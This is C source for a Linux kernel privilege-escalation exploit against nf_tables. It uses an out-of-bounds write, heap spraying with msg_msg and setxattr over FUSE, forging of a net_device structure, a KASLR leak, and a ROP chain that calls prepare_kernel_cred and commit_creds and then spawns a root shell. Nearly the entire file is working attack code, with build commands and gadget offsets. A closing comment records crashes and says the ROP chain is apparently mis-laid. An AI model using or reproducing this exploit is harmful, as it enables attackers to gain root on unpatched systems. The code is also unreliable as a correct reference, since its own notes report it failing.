// dynamic $ gcc -no-pie ./exploit.c ./fakefuse.c  -I/usr/include/fuse -lfuse -masm=intel -pthread -lmnl -lnftnl -o exploit
#define _GNU_SOURCE
#include "fakefuse.h"
#include <arpa/inet.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/sched.h>

// #define DEBUG
#define SPRAY_128 500
#define SPRAY_128_FREE_IDX 400  // leak 400th msg and place a vul obj
#define SPRAY_192 500
#define SPRAY_192_FREE_IDX 400
#define SPRAY_4K 1000           // spray 1000 setxattr()+FUSE
#define LEAK_HEAP_MAX_TRIES 10

void shell();

int spray_128_qids[SPRAY_128], spray_192_qids[SPRAY_192], spray_4k_qids[SPRAY_4K]; // kmalloc-128 / kmalloc-192 / kmalloc-4k msg_msg queue
int child_done = 0;

pthread_t thids[SPRAY_4K];
uint64_t setxattr_bufs[SPRAY_4K], setxattr_bufs_2[SPRAY_4K];  // setxattr() - user bufs

uint64_t child_net_device_leak = -1, net_device_leak = -1;  // heap addr of `net_device` object 
uint64_t kernel_base;

const char *spray1_path = "1", *spray2_path = "2";
char *fargs_fuse[] = {"exploit", "/tmp/foo", NULL};

static const struct fuse_operations fuse_ops = {
  .getattr = fuse_getattr,
  .readdir = fuse_readdir,
  .read = fuse_read
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

int32_t make_queue(key_t key, int msgflg) {
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (ret < 0) 
        perror("msgrcv");
    return ret;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg) {
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) 
        perror("msgsend failure");
    return;
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]status has been saved.");
}
// vuln() —— trigger OOB write   (legit_writes - # of legit rules; oob_writes - # of OOB rules)
void vuln(int oob_writes, int legit_writes) {
  // setup table
  struct nftnl_table *table = nftnl_table_alloc();
  nftnl_table_set_str(table, NFTNL_TABLE_NAME, "x");  // table x
  nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

  // chain
  struct nftnl_chain *chain = nftnl_chain_alloc();
  nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "x"); 
  nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "y");  // chain y
  nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_NETDEV_INGRESS);
  nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
  nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");
  nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
  //rule
  struct nftnl_rule *rule = nftnl_rule_alloc();
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "x");
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "y");
  // expression
  struct nftnl_expr *exprs[128];
  int exprid = 0;

  exprs[exprid] = nftnl_expr_alloc("meta");
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_KEY, NFT_META_PROTOCOL);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_DREG, NFT_REG_1);
  nftnl_rule_add_expr(rule, exprs[exprid]);
  exprid++;

  exprs[exprid] = nftnl_expr_alloc("cmp");
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
  nftnl_expr_set_u16(exprs[exprid], NFTNL_EXPR_CMP_DATA, 8);
  nftnl_rule_add_expr(rule, exprs[exprid]);
  exprid++;

  exprs[exprid] = nftnl_expr_alloc("payload");
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_OFFSET, 16);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_LEN, 4);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_DREG, NFT_REG_1);
  nftnl_rule_add_expr(rule, exprs[exprid]);
  exprid++;

  exprs[exprid] = nftnl_expr_alloc("cmp");
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
  nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_DATA, 0x0200007f);
  nftnl_rule_add_expr(rule, exprs[exprid]);
  exprid++;

// # of legit rules - control the targeted kmalloc size
  for (int i = 0; i < legit_writes; i++) {
    exprs[exprid] = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DREG, NFT_REG_1);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DATA, 1);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;
    exprs[exprid] = nftnl_expr_alloc("dup");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;
  }

// # of OOB rules - oob writes
  for (int unaccounted_dup = 0; unaccounted_dup < oob_writes; unaccounted_dup++) {
    exprs[exprid] = nftnl_expr_alloc("dup");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;
  }

  // serialize
  char buf[MNL_SOCKET_BUFFER_SIZE];

  struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  int seq = 0;

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  struct nlmsghdr *nlh;
  nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_NETDEV, 0, seq++);
  nftnl_table_nlmsg_build_payload(nlh, table);  // table
  mnl_nlmsg_batch_next(batch);

  nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_NETDEV, NLM_F_CREATE, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain);  // chain

  mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));  // NFTA_CHAIN_FLAGS 10
  mnl_nlmsg_batch_next(batch);

  nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_NETDEV, NLM_F_CREATE | NLM_F_APPEND, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);    // rule
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);
  // send packet
  struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL) 
    err(1, "mnl_socket_open");

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) 
    err(1, "mnl_socket_send");
}

// spray_128_msgseg() —— spray 500 msg_msg+msg_msgseg (kmalloc-4k + kmalloc-128)
void spray_128_msgseg() {
  char buffer[0x4000] = {0};
  msg *message = (msg *)buffer;

  memset(buffer, 0x41, sizeof(buffer));
  for (int i = 0; i < SPRAY_128; i++) {
    int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    // this will allocate a 4k msg_msg and a 128 msg_msgseg
    send_msg(spray, message, 0x1080 - 0x40, 0);
    spray_128_qids[i] = spray;
  }
}

void delete_128(int i) {
  char buf[0x1000] = {0};
  get_msg(spray_128_qids[i], buf, 128 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
}
// check_heap_leak() —— read/free all msg to leak `net_device` 
uint64_t check_heap_leak() {
  char buffer[0x4000] = {0};
  uint64_t leak = -1;

  for (int i = 0; i < SPRAY_128; i++) {
    if (i == SPRAY_128_FREE_IDX) continue;

    get_msg(spray_128_qids[i], buffer, 0x1080 - 0x40, 0, IPC_NOWAIT);

    if((((uint64_t *)buffer)[507] & 0xffff000000000000) == 0xffff000000000000) // ((0x1000-0x30)+(0)) / 8 = 506 
      leak = ((uint64_t*)buffer)[507];                                         // 1st 8 bytes == msg_type
  }
  return leak;
}
// do_heap_leak() —— leak heap address of net_device
uint64_t do_heap_leak() {
  int i = 0;
  uint64_t leak;

  do {
    #ifdef DEBUG
    printf("[*] leak net_device try no. %d\n", ++i);
    #endif

    spray_128_msgseg();             // 1. spray 500 kmalloc-128
    delete_128(SPRAY_128_FREE_IDX); // 2. free 400th kmalloc-128
    vuln(1, 1);                     // 3. trigger OOB write
    leak = check_heap_leak();       // 4. leak `net_device`
  } while ((leak == -1) && (i < LEAK_HEAP_MAX_TRIES));

  return leak;
}

int child(void *a) {
  child_net_device_leak = do_heap_leak();
  child_done = 1;
  sleep(10000);
}
// leak_heap() —— leak heap addr of `net_device` object in child & parent process
void leak_heap(int leak_child) {
// 2-1. Leak child's net_device struct
  if (leak_child) {
    void* stack = malloc(200000);
    int tid = clone(child, stack + 200000, CLONE_VM|CLONE_NEWUSER|CLONE_NEWNET, NULL);

    // Wait for child to exit
    while (!child_done) 
      { sleep(1); }

    free(stack);
    if(child_net_device_leak == -1) {
      puts("[-] couldn't leak child's net_device ptr");
      exit(1);
    }
  } else { 
// 2-2. Leak parent's net_device struct
    net_device_leak = do_heap_leak();
    if(net_device_leak == -1) {
      puts("[-] couldn't leak parent's net_device ptr");
      exit(1);
    }
  }
}

// setup_setxattr() —— setup setxattr_bufs[] to spray setxattr() in kmalloc-4k to forge `net_device`
void setup_setxattr() {
  uint64_t mmap_addr = 0x50000000;

  system("touch /tmp/foo.txt");

  int fd = open("/tmp/foo/1", O_RDWR);
  if (fd < 0) {
    perror("open() failed");
    exit(-1);
  }

  for (int i = 0; i < SPRAY_4K; i++) {
    setxattr_bufs[i] = (uint64_t)mmap((void*)mmap_addr, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    if (setxattr_bufs[i] != (uint64_t)mmap_addr) {
      perror("[!] setup_setxattr(): mmap error 1");
      exit(1);
    }
  
    memset((void*)(setxattr_bufs[i]), 0x42, 0x1000);
    memset(((void*)(setxattr_bufs[i])) + 0x1000 - 700, 0x0, 700);
// start at 0x10
    ((uint64_t*)(setxattr_bufs[i]))[2] = 0x6f6c;      // dev->name = "lo"
    ((uint64_t*)(setxattr_bufs[i]))[104] = child_net_device_leak + 0xc8; // (104-2)*8=0x330 dev->dev_addr = &dev->netdev_ops 
    ((uint64_t*)(setxattr_bufs[i]))[78] = 0x0808080800000000; // 0x260 dev->addr_len = 0x08
    ((uint64_t*)(setxattr_bufs[i]))[28] = 0x42424242; // 0xd0 dev->ifindex = 0x42424242 -   We can use if_nametoindex("lo") to check if forging succeed
// hang up at setxattr_bufs[i]+0x1000
    if (((uint64_t)mmap((void*)(setxattr_bufs[i]+0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0)) != (setxattr_bufs[i] + 0x1000)) {
      perror("[-] setup_setxattr(): mmap error 2");
      exit(1);
    }

    mmap_addr += 0x2000;
  }
}

void *setxattr_sprayer(void *i) { // start at 0x10 to hang up at setxattr_bufs[i]+0x1000
  setxattr("/tmp/foo.txt", "user.spray", (void*)setxattr_bufs[*(int*)i]+16, 0x1000, XATTR_CREATE);
}
// spray_4k() —— spray 1000 setxattr()+FUSE to forge `net_device`
void spray_4k() {
  for (int i = 0; i < SPRAY_4K; i++) {
    int* arg = malloc(sizeof(int));
    *arg = i;
    pthread_create(&thids[i], NULL, setxattr_sprayer, arg);
  }
}

// spray_192() —— spray 500 msg_msg in kmalloc-192
void spray_192() {
  char buffer[0x4000] = {0};
  msg *message = (msg *)buffer;

  memset(buffer, 0x41, sizeof(buffer));
  for (int i = 0; i < SPRAY_192; i++) {
    int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(spray, message, 192 - 0x30, 0);
    spray_192_qids[i] = spray;
  }
}

void delete_192(int i) {
  char buf[0x1000] = {0};
  get_msg(spray_192_qids[i], buf, 192 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
}
// free_netdevice() —— OOB write 3rd msg_msg->security to free `net_device`  0x18 0x68 0xb8 (0xc0+0x48) (0xc0+0x98) (0xc0+0xc0+0x28)
int free_netdevice() {
  char buf[0x300];

  spray_192();                          // 1. spray 500 kmalloc-192
  delete_192(SPRAY_192_FREE_IDX);       // 2. free 400th kmalloc-192
  vuln(6, 2);                           // 3. trigger OOB write (write a `net_device` pointer at 3rd msg_msg->security)

  for (int i = 0; i < SPRAY_192; i++) { // 4. release one `net_device`
    if (i == SPRAY_192_FREE_IDX) continue;

    get_msg(spray_192_qids[i], buf, 192 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);

    if (((uint64_t*)buf)[0] == 0x4141414100000005)
      return 0;
  }
  return -1;
}
// kaslr_leak() —— ioctl(SIOCGIFHWADDR) read mac address
uint64_t kaslr_leak() {
  struct ifreq *leak = calloc(1, 0x1000);
  strcpy(leak->ifr_name, "lo");

  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
  if (!fd) {
    perror("[-] socket()");
    exit(1);
  }

  if (ioctl(fd, SIOCGIFHWADDR, leak) != 0) {
    perror("[-] ioctl(SIOCGIFHWADDR)");
    exit(1);
  }

  uint64_t kaslr_leak = ((uint64_t*)leak->ifr_addr.sa_data)[0];

  if ((kaslr_leak & 0xffffffff00000000) == 0xffffffff00000000)
    return kaslr_leak;

  return -1;
}

uint64_t stack_pivot_gadget = 0xffffffff81a51b75 - 0xffffffff81000000;    // 0xffffffff81a51b75: push rdi; cmp eax, 0x415bffff; pop rsp; pop rbp; ret;            /   0xffffffff812bdfde: push rdi; pop rsp; ret; 
uint64_t pop_rdi_ret = 0xffffffff8100659f - 0xffffffff81000000;           // 0xffffffff8100659f : pop rdi ; ret
uint64_t prepare_kernel_cred = 0xffffffff810ceaa0 - 0xffffffff81000000;   // ffffffff810ceaa0 T prepare_kernel_cred
uint64_t commit_creds = 0xffffffff810ce5a0 - 0xffffffff81000000;          // ffffffff810ce5a0 T commit_creds
uint64_t pop_rcx_ret = 0xffffffff81221883 - 0xffffffff81000000;           // 0xffffffff81221883 : pop rcx ; ret
uint64_t cmp_rcx_jne_pop_ret = 0xffffffff810779eb - 0xffffffff81000000;   // 0xffffffff810779eb : cmp rcx, 4 ; jne 0xffffffff810779c9 ; pop rbp ; ret
uint64_t mov_rdi_rax_jne_ret = 0xffffffff8159eb04 - 0xffffffff81000000;   // 0xffffffff8159eb04 : mov rdi, rax ; jne 0xffffffff8159eaf1 ; xor eax, eax ; ret
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81e00ff0 + 22 - 0xffffffff81000000;  // ffffffff81e00ff0 T swapgs_restore_regs_and_return_to_usermode

void shell() {
  syscall(SYS_execve, "/bin/sh", 0, 0);
}
// setup_setxattr_2() —— setup setxattr_bufs_2[] (ROP) to spray setxattr() in kmalloc-4k to forge `net_device`
void setup_setxattr_2() {
  uint64_t mmap_addr = 0x60000000;

  system("touch /tmp/foo.txt");

  int fd = open("/tmp/foo/2", O_RDWR);
  if (fd < 0) {
    perror("[-] open() failed");
    exit(-1);
  }

  for (int i = 0; i < SPRAY_4K; i++) {
    setxattr_bufs_2[i] = (uint64_t)mmap((void*)mmap_addr, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    if (setxattr_bufs_2[i] != (uint64_t)mmap_addr) {
      perror("[-] setup_setxattr_2(): mmap error 1");
      exit(1);
    }
  
    memset((void*)(setxattr_bufs_2[i]), 0x42, 0x1000);
    memset(((void*)(setxattr_bufs_2[i])) + 0x1000 - 700, 0x0, 700);
// place ROP: start from 0x10
    int k = 2;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0x6f6c; // dev->name = "lo"
    // ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0x4444444444444444;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + pop_rdi_ret;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0x0; // rdi
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + prepare_kernel_cred;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + pop_rcx_ret;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 4;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + cmp_rcx_jne_pop_ret;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0xffffffffffffffff;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + mov_rdi_rax_jne_ret;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + commit_creds;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = kernel_base + swapgs_restore_regs_and_return_to_usermode;
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0x0;                        // rax
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = 0x0;                        // rdi
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = (uint64_t)shell;            // user_rip
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = user_cs;                    // user_cs
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = user_rflags;                // user_rflags
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = user_sp;                    // user_sp
    ((uint64_t*)(setxattr_bufs_2[i]))[k++] = user_ss;                    // user_ss
  
    ((uint64_t*)(setxattr_bufs_2[i]))[28] = 0x43434343; // 0xd0  dev->ifindex = 0x43434343
    ((uint64_t*)(setxattr_bufs_2[i]))[68] = (net_device_leak + 0x218) - 0xc8; // 0x210 dev->ethtool_ops       
    ((uint64_t*)(setxattr_bufs_2[i]))[69] = kernel_base + stack_pivot_gadget; // 0x218 *func ptr  (69-2)*8 = 0x218       0xc8 ethtool_ops->begin()
// hang up at setxattr_bufs_2[i]+0x1000
    if (((uint64_t)mmap((void*)(setxattr_bufs_2[i]+0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0)) != (setxattr_bufs_2[i] + 0x1000)) {
      perror("[-] setup_setxattr_2(): mmap error 2");
      exit(1);
    }

    mmap_addr += 0x2000;
  }
}

void *setxattr_sprayer_2(void *i) {
  if (setxattr("/tmp/foo.txt", "user.spray", (void*)setxattr_bufs_2[*(int*)i]+16, 0x1000, XATTR_CREATE) == -1) {
    perror("setxattr");
    exit(1);
  }
}
// spray_4k_2() —— spray 1000 setxattr()+FUSE to forge `net_device` (place ROP)
void spray_4k_2() {
  for (int i = 0; i < SPRAY_4K; i++) {
    int* arg = malloc(sizeof(int));
    *arg = i;
    pthread_create(&thids[i], NULL, setxattr_sprayer_2, arg);
  }
}
// rop() —— trigger net_device->ethtool_ops.begin() to hijack control-flow
void rop() {
  struct ethtool_cmd ecmd;
  struct ifreq ifr;
  int fd;

  memset(&ecmd, 0, sizeof(ecmd));
  memset(&ifr, 0, sizeof(ifr));

  if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    perror("[-] socket()");
    exit(1);
  }

  ecmd.cmd = ETHTOOL_GSET;
  ifr.ifr_data = (caddr_t)&ecmd;
  strncpy(ifr.ifr_name, "lo", IF_NAMESIZE);
  ifr.ifr_name[IF_NAMESIZE-1] = '\0';

  if (!(ioctl(fd, SIOCETHTOOL, &ifr) < 0)) {    // trigger control-flow hijacking
      perror("[-] ioctl(SIOCETHTOOL)");
      exit(1);
  }
  puts("[+] ioctl(SIOCETHTOOL) done");
}

int main(int argc, char **argv) {
// 1. initialize
  puts("[1] initialize: namespace");
// 1-1. Unshare
  if (geteuid() != 0) {
    char *args[] = {"unshare", "-Urnm", argv[0], NULL, };
    execvp("unshare", args);
    err(1, "unshare re-exec");
  }
// 1-2. Assign to cpu 0
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(0, &my_set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
    perror("sched_setaffinity()");
    exit(1);
  }
// 1-3. Setup FUSE
  mkdir(MNT_PATH, 0777);
  pipe(spray1_pipes);   // spray1_pipes —— notify fuse_read() to return

  int pid = fork();
  if (!pid) {
    fuse_main(sizeof(fargs_fuse) / sizeof(char *) - 1 , fargs_fuse, &fuse_ops, NULL);
    puts("[!] END OF FUSE MAIN 1");
    sleep(500);
  }
  sleep(2); // Wait for fuse_main
// 1-4 Save state to return to userland
  save_status();

// 2. leak heap addr of `net_device` object in child & parent process
  puts("\n[2] Leak child and parent net_device");
  leak_heap(0);
  printf("[+] parent net_device ptr: 0x%lx\n", net_device_leak);        // used to leak kernel_base

  leak_heap(1);
  printf("[+] child  net_device ptr: 0x%lx\n", child_net_device_leak);  // used to hijack control-flow

// 3. leak kernel base
  puts("\n[3] leak kernel base");
// 3-1. setup setxattr_bufs[] to spray setxattr() in kmalloc-4k to forge `net_device`
  setup_setxattr();
// 3-2. free `net_device` (OOB write 3rd msg_msg->security) 
  puts("[3-2] Spray kmalloc-192, overwrite msg_msg->security ptr and free net_device");
  int freed = 0;
  for (int i = 0; i < 20; i++) {
    #ifdef DEBUG
    printf("[*] free net_device try no. %d\n", i);
    #endif

    if(free_netdevice() != -1) {
      freed = 1;
      break;
    }
    // usleep(500000);
  }
  if(!freed) {
    puts("[-] couldn't free net_device");
    exit(1);
  }
  puts("[+] net_device struct freed");

// 3-3. forge `net_device`
  puts("[3-3] Spray kmalloc-4k using setxattr + FUSE to realloc net_device");
  spray_4k();
  sleep(2);

  if (if_nametoindex("lo") == 0x42424242) {   // Check whether `net_device` forging succeeds.
    puts("[+] `net_device` is successfully forged");
  } else {
    puts("[-] couldn't realloc net_device struct");
    exit(1);
  }

// 3-4. leak kernel base
  puts("[3-4] leak kernel base");
  if ((kernel_base = kaslr_leak()) == -1) {
    puts("[-] couldn't leak kernel base");
    exit(1);
  }

  printf("[+] kernel addr: 0x%lx\n", kernel_base);
  kernel_base -= 0x1308300;                       //  0x130a420 
  printf("[+] kernel base: 0x%lx\n", kernel_base);

// 4. Free net_device and re-forge it
  puts("\n[4] Release setxattrs, free `net_device`, and realloc it again");
// 4-1. free setxattrs (free `net_device`)
  char buf[SPRAY_4K] = {0};
  write(spray1_pipes[1], buf, sizeof(buf));

  for (int i = 0; i < SPRAY_4K; i++)
    pthread_join(thids[i], NULL);

// 4-2. spray 4k setxattr buffers to forge `net_device`
  setup_setxattr_2();
  spray_4k_2();
  sleep(2);

  if (if_nametoindex("lo") == 0x43434343) {
    puts("[+] obtained net_device struct");
  } else {
    puts("[-] couldn't realloc net_device struct");
    exit(1);
  }

// 5. trigger net_device->ethtool_ops.begin() to hijack control-flow
  puts("\n[5] rop :)");
  rop();

  return 0;
}
/*
(1) 无法泄露内核基址
[3] leak kernel base
[-] couldn't realloc net_device struct

(2) 劫持控制流后访存错误
应该只是ROP链布置的问题

$ ./exploit
[1] initialize: namespace
[1] initialize: namespace
[+]status has been saved.

[2] Leak child and parent net_device
[+] parent net_device ptr: 0xffff8880077fd000
[+] child  net_device ptr: 0xffff88800aab4000

[3] leak kernel base
[3-2] Spray kmalloc-192, overwrite msg_msg->security ptr and free net_device
[+] net_device struct freed
[3-3] Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] `net_device` is successfully forged
[3-4] leak kernel base
[+] kernel addr: 0xffffffff82308300
[+] kernel base: 0xffffffff81000000

[4] Release setxattrs, free `net_device`, and realloc it again
[+] obtained net_device struct

[5] rop :)


root@syzkaller:/home/hi/exploit# [   68.958258] general protection fault: 0000 [#1] SMP NOPTI
[   68.959782] CPU: 0 PID: 311 Comm: exploit Not tainted 5.13.19 #1
[   68.959999] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   68.960204] RIP: 0010:0x4444444444444444
[   68.960611] Code: Unable to access opcode bytes at RIP 0x444444444444441a.
[   68.960720] RSP: 0018:ffff8880077fd010 EFLAGS: 00000a12
[   68.961063] RAX: ffffffff81a51b75 RBX: ffff8880065a0000 RCX: 0000000000000001
[   68.961162] RDX: 0000000000000004 RSI: 00007ffc83625a14 RDI: ffff8880077fd000
[   68.961196] RBP: 0000000000006f6c R08: 32d1378d00c68c24 R09: 0000000000000002
[   68.961196] R10: 0000000000000000 R11: 0000000000000000 R12: 00007ffc83625a10
[   68.961196] R13: ffffc90000267e30 R14: ffff8880077fd000 R15: 0000000000000000
[   68.961196] FS:  00007fb371b10740(0000) GS:ffff88803ec00000(0000) knlGS:0000000000000000
[   68.961196] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   68.961196] CR2: 00000000607c1000 CR3: 0000000007778000 CR4: 00000000000006f0



(3)
    -ex "b net/core/dev_ioctl.c:412" \
    -ex "b net/ethtool/ioctl.c:2753" \



*/